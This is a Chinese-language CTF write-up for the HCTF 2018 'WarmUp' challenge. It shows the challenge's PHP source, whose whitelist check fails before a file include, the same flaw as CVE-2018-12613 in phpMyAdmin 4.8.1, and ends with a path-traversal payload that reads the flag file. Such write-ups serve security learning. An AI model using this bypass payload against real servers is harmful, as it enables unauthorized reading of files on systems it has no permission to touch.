# [HCTF 2018]WarmUp
TAG:PHP phpmyadmin4.8.1远程文件包含漏洞(CVE-2018-12613)
## 解题过程：  
![20210108101447](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108101447.png)  
查看入口源代码：  
![20210108103319](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108103319.png)  
发现提示：```source.php```  
![20210108103405](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108103405.png)  
```
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];//白名单
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );//需要绕过
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])//存在file且不为空
        && is_string($_REQUEST['file'])//file为字符串
        && emmm::checkFile($_REQUEST['file'])//导入进行检测
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```
  
访问一下白名单里的hint.php  
![20210108103847](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108103847.png)  
有一个提示，flag放在ffffllllaaaagggg文件中  
继续进行代码审计，这里有一个文件包含漏洞  
```
$_page = mb_substr( //获取page中从开头到'?'中间的字符
       $_page,
       0,
       mb_strpos($_page . '?', '?')//查找到'?'在字符串中第一次出现的位置
);
```
![20210108103949](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108103949.png)  
![20210108104037](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108104037.png)  
Payload:```index.php?file=hint.php?../../../../../ffffllllaaaagggg```  
![20210108104146](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108104146.png)  